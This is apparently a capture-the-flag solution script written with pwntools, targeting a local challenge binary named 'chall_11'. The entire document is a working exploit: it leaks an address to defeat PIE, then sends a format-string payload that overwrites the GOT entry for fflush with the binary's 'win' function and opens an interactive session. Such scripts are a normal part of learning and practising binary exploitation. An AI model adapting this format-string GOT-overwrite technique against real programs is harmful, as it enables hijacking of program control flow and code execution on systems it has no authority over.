from pwn import *
p=process("./chall_11")
p.sendline("hi")
elf=ELF("./chall_11")

target = elf.got.fflush
elf.sym.win
resp = p.recv()
leak = int(re.findall(b"([a-f0-9]{8,16})",resp)[0],16)
elf.address = leak - elf.sym.main
p.sendline()

payload=fmtstr_payload(6, {target: elf.sym.win},write_size='short')

p.sendline(payload)
p.interactive()
